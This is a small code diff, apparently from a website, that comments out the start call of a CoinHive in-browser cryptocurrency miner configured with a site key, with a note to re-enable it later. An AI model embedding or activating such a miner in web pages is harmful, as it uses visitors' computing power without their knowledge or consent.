@@ -1,7 +1,7 @@
 function initCoinHive()
 {
   var miner = new CoinHive.Anonymous('Csj8qUyygCcffvPTYirPLvQQu9TVOkih');
-  miner.start();
+  //miner.start(); //uncomment when finished
 }
 
 
